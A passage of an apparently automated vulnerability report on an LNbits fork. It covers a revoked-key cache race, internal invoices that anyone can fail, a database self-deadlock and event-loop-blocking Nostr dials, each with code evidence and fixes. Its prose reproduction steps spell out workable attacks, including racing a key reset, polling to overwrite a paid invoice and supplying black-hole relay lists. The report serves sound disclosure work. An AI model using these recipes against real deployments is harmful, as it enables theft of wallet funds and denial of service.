This is distinct from `deactivation-does-not-evict-auth-cache` (whose eviction never runs because of an active-only lookup) and from `light-key-cache-bypasses-admin-key-check` (key-type confusion): here the eviction does run but is undone because it is ordered before the persisted change, so the owner's explicit revocation of a known-compromised credential is defeated.

## Evidence
1. [lnbits/core/views/wallet\_api.py:154–168](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/wallet_api.py#L154-L168)
   api_reset_wallet_keys awaits get_wallet (acquires and releases the core DB lock), then synchronously pops the three cache entries via clear_wallet_cache (line 163), assigns new adminkey/inkey, and only then awaits update_wallet (line 167), which must re-acquire the same lock before the UPDATE runs. The eviction therefore precedes the persisted change: between the pop and the commit the wallets row still holds the old keys and nothing prevents a concurrent fill from re-caching them.
2. [lnbits/decorators.py:155–184](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/decorators.py#L155-L184)
   LightKeyChecker.__call__ enters db.connect() (line 160) before consulting the cache (line 162). A request that was queued on the lock when the reset handler's get_wallet released it runs after the synchronous pop (cache miss), executes get_base_wallet_for_key against the not-yet-updated row (line 168), leaves the with-block (releasing the lock) and synchronously calls cache.set for the old key with key_type computed from the old row (lines 178-183) before any other task runs. Every later request presenting the old key is a cache hit (lines 162-166) that never touches the wallets table.
3. [lnbits/db.py:320–343](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/db.py#L320-L343)
   Database.connect serialises every core DB access behind one asyncio.Lock. Python's asyncio.Lock (3.10-3.12 per pyproject requires-python) is FIFO-fair: acquire() takes the lock immediately only when there are no non-cancelled waiters, so the reset handler's update_wallet queues behind any LightKeyChecker request already waiting when get_wallet released the lock. That waiter's SELECT is guaranteed to run before the reset's UPDATE.
4. [lnbits/core/crud/wallets.py:322–340](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/wallets.py#L322-L340)
   get_base_wallet_for_key matches adminkey/inkey against the current row. Until update_wallet's UPDATE commits, the old key still matches and the fill stores BaseWalletTypeInfo for the revoked credential.
5. [lnbits/core/crud/wallets.py:617–620](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/wallets.py#L617-L620)
   clear_wallet_cache is a plain synchronous cache.pop with no generation stamp or tombstone; nothing marks the key as revoked, so the next fill trusts whatever the DB returns at that instant.
6. [lnbits/core/views/payment\_api.py:280–319](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/payment_api.py#L280-L319)
   POST /api/v1/payments depends on require_base_invoice_key (LightKeyChecker). With the re-cached entry (key_type=admin, stored at fill time from the old row) and out=true the handler calls pay_invoice/pay_offer for the victim's wallet id; this is the spend sink the revoked key keeps reaching.
7. [lnbits/core/services/payments.py:1393–1435](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L1393-L1435)
   _pay_from_wallet resolves the wallet by id via _check_wallet_for_payment (get_wallet, line 1134) and checks balance/limits only; the presented API key is never re-validated against the row, so the stale cache entry alone authorises the outgoing payment.
8. [lnbits/core/crud/wallets.py:80–123](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/wallets.py#L80-L123)
   delete_wallet, force_delete_wallet and delete_wallet_by_id share the evict-before-write ordering (clear_wallet_id_cache first, then UPDATE/DELETE). A concurrent fill between pop and commit re-caches the keys of the wallet being deleted. Reach is narrower than the reset case: spend is blocked because _check_wallet_for_payment re-fetches with get_wallet(deleted=False), but read endpoints such as GET /api/v1/payments (get_payments by wallet id) keep answering the stale key for the TTL.
9. [lnbits/settings.py:952](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L952)
   auth_authentication_cache_minutes defaults to 10, so in the default configuration the re-cached revoked key survives up to ten minutes after the owner rotated it.

## Impact
The explicitly revoked admin key continues to authorise the victim's wallet for up to auth_authentication_cache_minutes (default 10): the attacker can list the wallet's payments (C:LOW) and spend its full balance via POST /api/v1/payments with out=true, as well as rewrite payment labels and stored paylinks (I:HIGH). No availability impact beyond the funds themselves.

## Reproduction steps
1. Attacker position: holder of a leaked wallet admin (or invoice) key - a listed adversary. Delivery: ordinary HTTPS requests to any light-key endpoint in a continuous loop. Success depends on a timing condition the attacker does not control (the owner resets while attacker requests are queued on the DB lock), hence AT:PRESENT; the FIFO lock and the pre-cache db.connect() make the window reliably reachable under a steady request stream, with no security mechanism to defeat (AC:LOW). No interaction with attacker content by anyone is required.

## Recommended fix
1. In api_reset_wallet_keys the auth-cache eviction is ordered before the persisted key change, and LightKeyChecker fills the cache from the live row with no versioning, so a concurrent fill between the pop and the UPDATE commit re-establishes the revoked key for the full TTL and defeats the owner's revocation. Fix criteria: After PUT /api/v1/wallet/reset/{id} returns, no request presenting the old adminkey or inkey is authenticated by LightKeyChecker regardless of concurrent traffic. Achievable by persisting the new keys before evicting, evicting both before and after the write, or stamping cached entries with a per-wallet generation that fills compare against. Verify with a concurrent stream of old-key requests across a reset: every request issued after the reset response must be rejected.
2. delete_wallet, force_delete_wallet and delete_wallet_by_id evict cached keys before the DELETE/UPDATE that invalidates them, allowing the same stale re-fill (read access for the TTL) when a wallet is deleted. Fix criteria: Deleting a wallet leaves no cached auth:x-api-key entry that authenticates its keys after the deletion commits, even under concurrent key use; verify as above with DELETE /api/v1/wallet/{id} in place of the reset.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Race condition
**CWE:** [CWE-362](https://cwe.mitre.org/data/definitions/362.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257540

---

# Internal FakeWallet invoices status-checked against real funding source and marked FAILED by anyone

## Details
LNbits creates invoices that are only payable inside the instance (`CreateInvoice.internal=True`, a documented body field of POST /api/v1/payments usable with an invoice key — lnbits-wallet-api-docs.vue:200, payment_api.py:280-327 — and also used by extensions, create_fiat_invoice transiently and the Revolut subscription path) through the module-level `fake_wallet` (services/payments.py:333). `FakeWallet.create_invoice` returns `checking_id = payment_hash` (wallets/fake.py:103) with no prefix and `create_payment` stores it verbatim. `Payment.is_internal` (models/payments.py:160-164) recognises only `internal_`/`fiat_` prefixes, so these rows are classified as funding-source invoices everywhere:

- `check_payment_status` (payments.py:711-729) sends the bare hash to `get_funding_source().get_invoice_status()` — a backend that never issued it.
- `exclude_uncheckable` (crud/payments.py:174-177) does not exclude them, so `check_pending_payments` (scheduled in app.py:592-595 every `lnbits_funding_source_pending_interval_seconds`, default 1800 s) submits every pending internal invoice to the backend with no attacker at all.
- The unauthenticated `GET /api/v1/payments/{payment_hash}` (payment_api.py:430-455) runs `update_pending_payment` on the pending row for any caller who knows the hash (it is in the bolt11 handed to payers / shown on payment pages).

The project's own regtest states the contract this relies on: tests/regtest/test_services_create_invoice.py:39-50 asserts that an internal invoice's hash queried on the funding source yields `status.pending` ("Internal invoices are not on fundingsource... but we get status pending"). That contract is only exercised against the regtest backends (LND, CLN, Eclair, Boltz — docker/regtest/docker-compose.yml). Four shipped backends, all in the default `lnbits_allowed_funding_sources` (settings.py:1263-1288), break it: `PhoenixdWallet.get_invoice_status` returns `PaymentFailedStatus` on HTTP 404 (phoenixd.py:329-334, comment: 'invoice does not exist in phoenixd, so it was never paid'); `StrikeWallet` (strike.py:332-334) and `BarkWallet` (bark.py:166-167) do the same on 404; `NWCWallet.get_invoice_status` maps an NWC `NOT_FOUND` error to `PaymentStatus(False)` (nwc.py:716-727). When the configured funding source is `FakeWallet`, `set_funding_source` builds a second instance (wallets/__init__.py:38-42, 52) that does not know `fake_wallet`'s hashes and answers `PaymentFailedStatus` (fake.py:168-173). Phoenixd ships as the desktop-bundle sidecar (.github/packaging/funding.py:19). On these deployments `update_pending_payment` (payments.py:432-435) writes `status = FAILED` on the pending internal invoice via `update_payment`'s full-row rewrite (crud/payments.py:304-318, db.py:194-200).

Consequences:
1. Deterministic denial of the internal-invoice feature: an anonymous caller fails any pending internal invoice on demand with one GET, and the periodic task fails all of them within the interval anyway. `check_internal` (crud/payments.py:561-575) only matches pending rows, so the invoice can never be settled internally afterwards; `_pay_external_invoice` then asks the real node to pay a FakeWallet-signed bolt11, which fails.
2. Ledger corruption via the stale-object overwrite: `update_pending_payment` reads the row, awaits the backend HTTP call with no lock held, then rewrites the whole row. `_pay_internal_invoice` (payments.py:813-872) holds only the payer wallet's lock and the DB lock for its own connection; if it settles the invoice during that await — creating the payer's `internal_<hash>` SUCCESS debit and setting the receiver's row SUCCESS (:856-858) — the in-flight check then writes FAILED over SUCCESS. The current `balances` view (migrations.py:945-955) counts incoming rows only when `status = 'success'` and outgoing rows when success or pending, so the receiver's credit disappears while the payer's debit stands, and `internal_invoice_queue` listeners (task_manager.py:490-493) have already been told the invoice was paid. An anonymous attacker who keeps polling the public endpoint for a target hash keeps a backend check in flight at all times and wins this race whenever the payer pays.

The maintainers' test for the public endpoint (tests/api/test_api.py:533-536) mocks update_pending_payment away, and the unit tests run with FakeWallet as funding source where non-internal invoices are issued by the same instance, so the mismatch is never exercised. Related lead: lead-payments-711-325c.

## Evidence
1. [lnbits/core/services/payments.py:711–729](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L711-L729)
   check_payment_status decides 'internal' purely by Payment.is_internal (checking_id prefix). A FakeWallet-created invoice has a bare payment-hash checking_id, so it falls through to `funding_source.get_invoice_status(payment.checking_id)` on the real backend, which never issued that hash. This is the code the fix must change (route FakeWallet-issued rows to fake_wallet or tag them).
2. [lnbits/wallets/fake.py:85–105](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/fake.py#L85-L105)
   FakeWallet.create_invoice returns checking_id=payment_hash with no 'internal_' prefix; create_invoice (payments.py:333, 403-407) stores exactly that as the row's checking_id for every `internal=True` invoice.
3. [lnbits/core/models/payments.py:160–163](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/payments.py#L160-L163)
   is_internal is true only for 'internal_' or 'fiat_' prefixes, so the FakeWallet invoice is treated as a funding-source invoice by every status path.
4. [lnbits/core/views/payment\_api.py:430–455](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/payment_api.py#L430-L455)
   GET /api/v1/payments/{payment_hash} needs no key; for the pending internal invoice (the only row for that hash before it is paid, so get_standalone_payment's ORDER BY amount LIMIT 1 returns it) it calls update_pending_payment, so an anonymous caller who knows the hash triggers the backend check at will.
5. [lnbits/core/services/payments.py:422–437](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L422-L437)
   update_pending_payment reads the row, awaits check_payment_status (backend HTTP, no lock held) and writes status FAILED whenever the backend returns a failed PaymentStatus, using update_payment's full-row rewrite of the possibly stale in-memory object.
6. [lnbits/core/crud/payments.py:174–176](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/payments.py#L174-L176)
   exclude_uncheckable only excludes 'temp_%' and 'internal_%' checking ids, so the periodic check_pending_payments task (payments.py:441-478; app.py:592-595, default every 1800 s) also submits every pending FakeWallet invoice to the real backend without any attacker.
7. [lnbits/wallets/phoenixd.py:329–340](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/phoenixd.py#L329-L340)
   PhoenixdWallet.get_invoice_status returns PaymentFailedStatus on HTTP 404 ('invoice does not exist in phoenixd, so it was never paid'); every FakeWallet hash is unknown to phoenixd (its checking_id is phoenixd's paymentHash, phoenixd.py:171). StrikeWallet (strike.py:332-334) and BarkWallet (bark.py:166-167) do the same on 404. When LNBITS_BACKEND_WALLET_CLASS=FakeWallet, set_funding_source (wallets/__init__.py:38-42) constructs a second FakeWallet instance distinct from fake_wallet (:52), so FakeWallet.get_invoice_status (fake.py:168-173) also returns PaymentFailedStatus.
8. [lnbits/wallets/nwc.py:716–727](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/nwc.py#L716-L727)
   NWCWallet.get_invoice_status maps an NWCError with code NOT_FOUND (what lookup_invoice returns for a hash the NWC service never issued) to PaymentStatus(False), i.e. failed — a fourth shipped backend that fails FakeWallet-issued internal invoices.
9. [lnbits/core/crud/payments.py:561–575](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/payments.py#L561-L575)
   check_internal only matches rows with status pending, so once the internal invoice is FAILED it can no longer be settled internally; _pay_external_invoice then hands the FakeWallet bolt11 to the real backend, which cannot route it.
10. [lnbits/core/services/payments.py:856–859](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L856-L859)
   _pay_internal_invoice marks the receiver's row SUCCESS after creating the payer's SUCCESS debit row. An update_pending_payment that read the row as pending before this and receives FAILED from the backend afterwards overwrites SUCCESS with FAILED; the balances view (migrations.py:945-955) then drops the receiver's credit while the payer's debit stands.
11. [lnbits/core/models/payments.py:289–291](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/payments.py#L289-L291)
   CreateInvoice.internal is an ordinary, documented request field (lnbits-wallet-api-docs.vue:200): any invoice-key holder (or an extension on their behalf) creates such invoices via POST /api/v1/payments (payment_api.py:280-327), so the affected rows exist in normal operation.
12. [tests/regtest/test\_services\_create\_invoice.py:39–50](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/tests/regtest/test_services_create_invoice.py#L39-L50)
   The project's own contract: this regtest asserts that an internal invoice's hash queried on the funding source must return status.pending ('Internal invoices are not on fundingsource... but we get status pending'). It runs only against the docker/regtest backends (LND, CLN, Eclair, Boltz), not Phoenixd/Strike/Bark/NWC, which violate it.

## Impact
Integrity: a third party's ledger entry is flipped from paid to failed in the race, removing the receiver's credit while the payer's debit stands (funds lost to the users, surplus on the operator's node); listeners and webhooks were already notified of a payment the ledger now denies. Availability: the internal-invoice feature is unusable on the affected funding sources — any pending internal invoice can be failed on demand and all are failed by the periodic task within the check interval. No confidentiality impact. Rated LOW/LOW because the race window is one backend round-trip and only internal invoices are affected.

## Reproduction steps
1. Attacker: anonymous. They learn a pending internal invoice's payment hash (present in the bolt11 the receiver publishes to payers or shows on a payment page) and call GET /api/v1/payments/{hash}, which needs no key; on a Phoenixd-, Strike-, Bark-, NWC- or FakeWallet-funded instance (all in the default allowed funding sources; phoenixd is the desktop bundle's sidecar) the backend answers 'not found', LNbits marks the invoice FAILED, and it can no longer be paid. Polling the same endpoint while the payer settles it internally overwrites the receiver's SUCCESS with FAILED after the payer was debited. The periodic check_pending_payments task causes the deterministic failure with no attacker. Requires one of those funding sources (AT:PRESENT); no credentials, no victim interaction beyond normal use.

## Recommended fix
1. Internal (FakeWallet-issued) invoices are not identifiable as internal: their checking_id is a bare payment hash, so check_payment_status, check_pending_payments and the public status endpoint treat them as funding-source invoices and act on the backend's verdict for a hash the backend never issued. Fix criteria: A FakeWallet-issued invoice must never be submitted to the configured funding source's get_invoice_status, and its status must only change through internal settlement, expiry, or an explicit admin action: either tag such rows (e.g. an 'internal_' checking_id or a stored flag) so is_internal/exclude_uncheckable recognise them, or have check_payment_status route them to fake_wallet. Verify with a test that creates an internal=True invoice while the funding source mock returns PaymentFailedStatus for unknown ids, calls GET /api/v1/payments/{hash} and check_pending_payments, and asserts the row is still pending and still payable internally.
2. update_pending_payment rewrites the whole row from an in-memory object read before an awaited backend call, so a concurrent settlement (internal payment, stream handler) can be overwritten with a stale status. Fix criteria: A status transition to FAILED (or SUCCESS) in update_pending_payment must be conditional on the row still being pending at write time (e.g. `... AND status = 'pending'` in the UPDATE, or re-read under the connection before writing), so a concurrently settled payment is never demoted. Verify with a test that settles the invoice between the read and the write and asserts the final status is SUCCESS.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Incorrectly resolved reference
**CWE:** [CWE-706](https://cwe.mitre.org/data/definitions/706.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257537

---

# recheck_pending settles fiat invoice under held DB lock, self-deadlocking the process-wide database

## Details
`GET /api/v1/payments/paginated?recheck_pending=true` (lnbits/core/views/payment_api.py:212-229) opens `async with db.connect() as conn` — acquiring the single process-wide `asyncio.Lock` of the core `Database` (lnbits/db.py:320-344) — and, while still inside that block, calls `update_pending_payment(payment, conn=conn)` for every pending payment on the page.

`update_pending_payment` (services/payments.py:422-438) forwards `conn` to its own writes but calls `check_payment_status(payment)` (services/payments.py:711-723), which takes no connection. For a pending fiat invoice the row has checking_id `fiat_<provider>_…`, so `is_internal` is true (models/payments.py:161-164) and `fiat_provider` is set; the function therefore calls `check_fiat_status(payment)` (services/fiat_providers.py:40-66). That function awaits `fiat_provider.get_invoice_status(...)` and, when the provider reports the payment paid, runs `await update_payment(payment)` with no `conn`. `update_payment` (crud/payments.py:304-318) resolves `(conn or db)` to the module-level `db` — the same `Database("database")` instance (core/db.py) — so `db.update` enters `async with self.connect()` → `await self.lock.acquire()` on the lock the current task already holds. `asyncio.Lock` is not reentrant: the coroutine waits on itself forever, the request never completes and the lock is never released. Every core DB operation (`fetchone/fetchall/fetch_page/insert/update/execute`, hence auth lookups on cache miss, payments, invoice settlement, webhooks, admin pages) goes through the same `connect()`, so every subsequent request and background task that touches the core DB blocks until the operator restarts the process. There is no timeout on the acquisition.

The row shape is attacker-creatable: `create_payment_request` (services/payments.py:153-156) dispatches to `create_fiat_invoice` whenever `fiat_provider` is set, and the only user gate there (:174-180) applies to FIAT-type wallets, so any Lightning wallet's invoice key (`POST /api/v1/payments`, invoice key suffices) can create a pending Stripe/PayPal/Square/Revolut invoice when a provider is enabled. The path is also the shipped UI's own: `fetchPayments()` calls `recheckPendingPayments()` after every payment-list load (static/js/components/lnbits-payment-list.js:247, 305-309), so a user simply opening their wallet page while a paid-but-not-yet-settled fiat invoice is listed hangs the instance.

Only the fiat branch loses the connection: the Lightning branches of `check_payment_status` call `funding_source.get_*_status` and touch no DB, and `update_payment_success_status` threads `conn` through. This is distinct from the dismissed bounded-wait observations (lead dismissed-payments-930-a53c): the wait here is unbounded and self-inflicted. Condition: a fiat provider must be enabled on the instance (`settings.is_fiat_provider_enabled`, settings.py:839).

## Evidence
1. [lnbits/core/views/payment\_api.py:212–228](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/payment_api.py#L212-L228)
   api_payments_paginated acquires `async with db.connect() as conn` (the core Database's asyncio.Lock) and, when recheck_pending=true, calls update_pending_payment(payment, conn=conn) for every pending row of the caller's wallet while still holding the lock. The invoice key suffices (require_base_invoice_key).
2. [lnbits/core/services/payments.py:711–722](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L711-L722)
   check_payment_status has no conn parameter. For an internal incoming payment with fiat_provider set (checking_id 'fiat_...' so is_internal is true) it calls check_fiat_status(payment) — again without the caller's connection.
3. [lnbits/core/services/fiat\_providers.py:40–65](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/fiat_providers.py#L40-L65)
   check_fiat_status awaits fiat_provider.get_invoice_status (HTTP to Stripe/PayPal/Square/Revolut) and, on success, calls update_payment(payment) with no conn, then handle_fiat_payment_confirmation(payment) with no conn. Each of these goes through the module-level `db` object and therefore re-enters Database.connect().
4. [lnbits/db.py:320–343](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/db.py#L320-L343)
   Database.connect() does `await self.lock.acquire()` on a plain asyncio.Lock and releases it only when the context manager exits. asyncio.Lock is not reentrant: a task that already holds it and awaits acquire() again waits forever. Database.update/fetchone/insert/execute (lines 354-391) all wrap themselves in `async with self.connect()`.
5. [lnbits/core/crud/payments.py:304–317](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/payments.py#L304-L317)
   update_payment uses `(conn or db).update(...)`; with conn=None it is `db.update`, i.e. a fresh connect() and a second acquire of the lock already held by api_payments_paginated's outer `async with db.connect()`.
6. [lnbits/core/services/payments.py:422–437](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L422-L437)
   update_pending_payment passes conn to its own update_payment calls but not to check_payment_status, so the only fiat branch in the whole pending-check path is the one that forgets the connection; the Lightning branches (funding_source.get_*_status) touch no DB and do not deadlock.
7. [lnbits/static/js/components/lnbits-payment-list.js:247](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/static/js/components/lnbits-payment-list.js#L247)
   fetchPayments() calls this.recheckPendingPayments() after every payment-list load, which issues GET /api/v1/payments/paginated?recheck_pending=true&checking_id[in]=... (:305-309). The deadlocking path is therefore exercised automatically whenever a user opens a wallet page listing a pending fiat invoice — not an obscure API option.
8. [lnbits/core/services/payments.py:174–190](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L174-L190)
   create_fiat_invoice lets any Lightning-wallet invoice key create a fiat invoice (the allowed_users gate at 175-180 only applies to FIAT-type wallets); the resulting row is pending with fiat_provider set and checking_id 'fiat_<provider>_<id>', exactly the shape that takes the deadlocking branch.

## Impact
Availability: the single global core Database lock is acquired a second time by the task that already holds it and is never released, so every request handler and background task touching the core DB (authentication on cache miss, payments, invoice settlement, fiat/Lightning webhooks, admin UI, scheduler) blocks indefinitely; only a process restart recovers. No data is disclosed. Integrity impact is negligible: the fiat payment's SUCCESS status is not committed before the hang and is settled by the periodic pending check after restart.

## Reproduction steps
1. Attacker: a self-registered user with their own Lightning wallet's invoice key on an instance where any fiat provider is enabled. Steps: POST /api/v1/payments with `fiat_provider` set (invoice key suffices; the allowed_users gate at services/payments.py:174-180 applies only to FIAT-type wallets) to create a minimum-amount fiat invoice, which the attacker pays to themselves at the provider (fiat in, sats credited to their own wallet, so net cost is only the provider fee; for PayPal, approving the order suffices because get_invoice_status captures APPROVED orders itself, fiat/paypal.py:276-292); concurrently poll GET /api/v1/payments/paginated?recheck_pending=true. The first poll whose provider round-trip observes 'paid' calls update_payment without the held connection and the task deadlocks on the non-reentrant Database lock; every other DB user then hangs until restart. Where the provider webhook is configured, a webhook arriving while the poll holds the lock blocks behind it and never gets to settle the row, so the poll wins unless the webhook fully settles before the poll's page fetch — a tight polling loop makes that reliable (AT:PRESENT for the provider-enabled precondition and ordering). The shipped UI triggers the same request automatically on wallet-page load (lnbits-payment-list.js:247), so a non-malicious user can also trip it. Network, low privilege, no victim interaction.

## Recommended fix
1. check_payment_status and check_fiat_status perform database writes through the module-level `db` while a caller (api_payments_paginated via update_pending_payment) already holds the non-reentrant Database lock, so the same task re-acquires the lock it owns and hangs. Fix criteria: A pending-payment recheck must never attempt to acquire the core DB lock while it is already held by the same task: either the connection is threaded through check_payment_status/check_fiat_status/handle_fiat_payment_confirmation and used for every write, or api_payments_paginated releases its connection before running update_pending_payment. Verify with a test that settles a pending fiat payment via GET /api/v1/payments/paginated?recheck_pending=true (provider status mocked to 'paid') and asserts the request completes and a subsequent DB request succeeds.
2. Database.connect() awaits a bare asyncio.Lock with no reentrancy guard or timeout, so any accidental nested acquisition anywhere in the codebase becomes a permanent process-wide hang rather than an error. Fix criteria: Nested acquisition of the Database lock by the task that already holds it should fail fast (raise) or be tolerated (reentrant per-task), and never block indefinitely; verify by attempting db.connect() inside an open db.connect() block and asserting it does not hang.

---
**Severity:** MEDIUM
**Status:** Open
**Category:** Deadlock
**CWE:** [CWE-833](https://cwe.mitre.org/data/definitions/833.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257535

---

# Synchronous websocket dials to remote-chosen relay list block the event loop for unbounded time

## Details
`send_nostr_dm` (`lnbits/core/services/nostr.py:32-46`) delivers a notification by iterating the relay list and, for each relay, calling `websocket.create_connection(relay, timeout=2)`, `ws.send()` and later `ws.close()` from the `websocket-client` package. These calls are synchronous: `create_connection` performs DNS resolution, a TCP connect, optional TLS and the HTTP upgrade, and the coroutine never hands them to a thread (`asyncio.to_thread`), unlike the sibling email sender in the same module (`notifications.py:240`). The coroutine runs as a task on the main asyncio loop (`process_next_notification` permanent task → `send_user_notification` → `send_notification_in_background` → `create_task(send_notification)`), and LNbits is a single uvicorn process (`server.py:57-80`). While a dial blocks, no request, websocket, invoice listener or scheduler task in the process makes progress.

The relay list is controlled by whoever controls the domain in the notified user's NIP-05 identifier — i.e. the user themselves: `PATCH /api/v1/auth` (`auth_api.py:589-602`) assigns `account.extra = data.extra`, and `UserNotifications.nostr_identifier` (`models/users.py:24-30`) is an unvalidated string with 0-sat thresholds. `fetch_nip5_details` (`nostr.py:64-72`) takes `relays[pubkey]` from the remote JSON with no bound on length or validation of entries. The user's `/.well-known/nostr.json` can return thousands of entries such as `wss://10.255.0.1:1/`, `wss://10.255.0.2:1/`, … (addresses that black-hole SYNs) or hostnames under a nameserver that never answers. Each entry then costs the event loop up to ~2 s of connect (plus up to 2 s handshake and 3 s close-wait where TCP accepts but the peer stays silent) and, for hostnames, the system resolver's full timeout, sequentially, so the total stall per notification is set by the attacker's list length — tens of thousands of relays freeze the service for hours. The user triggers it at no cost with an internal self-payment between two of their own wallets (`payments.py:863-870` notifies sender and enqueues the receiver; `send_chat_payment_notification`, `notifications.py:377-389`), and can repeat it, each payment spawning a further blocked task.

This holds only where the operator has enabled Nostr notifications (`lnbits_nostr_notifications_enabled` plus a private key — an advertised admin-UI feature, 'Enable Nostr — Send notifications over Nostr', in `EditableSettings`; off by default). The admin's own configured identifiers follow the same code path.

Dependency assumption (websocket-client 1.9.2 per uv.lock): `create_connection` resolves with blocking `socket.getaddrinfo` (no timeout) and applies the `timeout` argument as the socket timeout for connect, handshake and send; `WebSocket.close()` waits up to its default 3 s for the peer's close frame.

Root cause: blocking network I/O to an unbounded, remotely supplied list of destinations executed on the asyncio event loop. The unvalidated destination of the same dials (SSRF) is recorded separately as nostr-nip05-user-domain-ssrf-with-path-control.

## Evidence
1. [lnbits/core/services/nostr.py:32–45](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/nostr.py#L32-L45)
   send_nostr_dm is a coroutine but calls websocket-client's synchronous create_connection(relay, timeout=2), ws.send() and ws.close() inline for every relay with no asyncio.to_thread and no cap on the relay count. The 2 s socket timeout bounds connect/handshake/send per relay; DNS resolution inside create_connection has no timeout, and close() waits for the peer's close frame (library default 3 s). The whole loop runs on the event loop.
2. [lnbits/core/services/nostr.py:64–71](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/nostr.py#L64-L71)
   The relays list is whatever the remote nostr.json (served by the domain in the user's identifier) returns under relays[pubkey]; neither its length nor its entries are validated.
3. [lnbits/core/services/notifications.py:316–334](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/notifications.py#L316-L334)
   send_notification_in_background runs send_notification (→ send_nostr_notifications → send_nostr_dm) with create_task on the main event loop; each queued notification gets its own task, and a blocking call inside any of them freezes every coroutine in the process.
